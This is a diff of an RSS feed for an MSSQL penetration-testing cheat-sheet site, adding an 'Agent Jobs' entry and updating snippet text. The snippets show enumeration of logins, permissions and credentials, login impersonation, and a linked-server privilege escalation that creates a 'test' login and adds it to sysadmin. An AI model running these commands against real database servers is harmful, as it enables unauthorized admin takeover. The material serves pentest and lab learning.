@@ -8,18 +8,25 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@mssql/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>MSSQL Agent Jobs</title>
+      <link>https://tldrbins.github.io/mssql_agent_jobs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_agent_jobs/</guid>
+      <description>1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Fix : Cannot resolve the collation conflict between &amp;#34;Latin1_General_CI_AI&amp;#34; and &amp;#34;SQL_Latin1_General_CP1_CI_AS&amp;#34; SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN=&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;; INSERT proxies EXEC msdb.</description>
+    </item>
+    <item>
       <title>MSSQL General</title>
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_general/</guid>
-      <description>General Connect to MSSQL DB impacket-mssqlclient -windows-auth username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.</description>
+      <description>General Connect to MSSQL DB (From Linux) impacket-mssqlclient &amp;#39;username:password@10.10.11.10&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;username:password@10.10.11.10&amp;#39; Connect to MSSQL DB (From Windows) # With inline query sqlcmd -S localhost -U username -P password -d db_name -Q &amp;#34;SELECT @@version;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
       <link>https://tldrbins.github.io/mssql_linked_server/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
-      <description>Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [CURRENT_SERVER]&amp;#39;) at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;Test1234!</description>
+      <description> Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [CURRENT_SERVER]&amp;#39;) at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;password&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [CURRENT_SERVER]&amp;#39;) AT [LINKED_SERVER] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;test&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [CURRENT_SERVER]&amp;#39;) AT [LINKED_SERVER] </description>
     </item>
     <item>
       <title>MSSQL Privilege Escalation</title>
